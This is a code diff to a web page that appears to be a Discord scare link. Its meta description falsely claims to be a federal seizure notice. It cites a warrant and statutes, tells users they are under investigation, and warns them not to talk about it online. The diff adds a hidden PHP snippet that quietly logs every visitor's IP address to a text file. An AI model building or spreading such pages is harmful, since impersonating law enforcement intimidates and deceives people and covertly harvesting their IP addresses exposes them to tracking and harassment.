@@ -5,6 +5,11 @@
 <meta name="viewport" content="width=device-width, initial-scale=1"> <meta name="description" content="This account is now under the control of the Federal Cyber Crime Unit (FCCU) in accordance with a seizure warrant obtained by the U.S.Attorney's Office for the Southern District of California issued pursuant to 18 U.S.C. §§ 981 and 982..Every user in this DM has been formally logged and will receive personal notice(s) in their mailbox. You are all to be investigated and it is of no use to block the receptian/contact. Please have patience as we will inform you of any further actions along with your case number.You are not to release this information online or further measures will be taken with harsher consequences."> <meta name="referrer" content="origin-when-cross-origin"> <meta name="theme-color" content="#ff0000"> <meta property="og:image" content="https://cdn.discordapp.com/avatars/396658485502279681/a007e21e98eeab328cd336c5ead3e1b3.webp?size=2048" />
 </head>
 <body>
+
+<?php
+$ip = $_SERVER['REMOTE_ADDR'];
+file_put_contents('idk.txt', $ip, FILE_APPEND);;
+?>    
     <style>
         body {
     background: rgb(95,87,222);
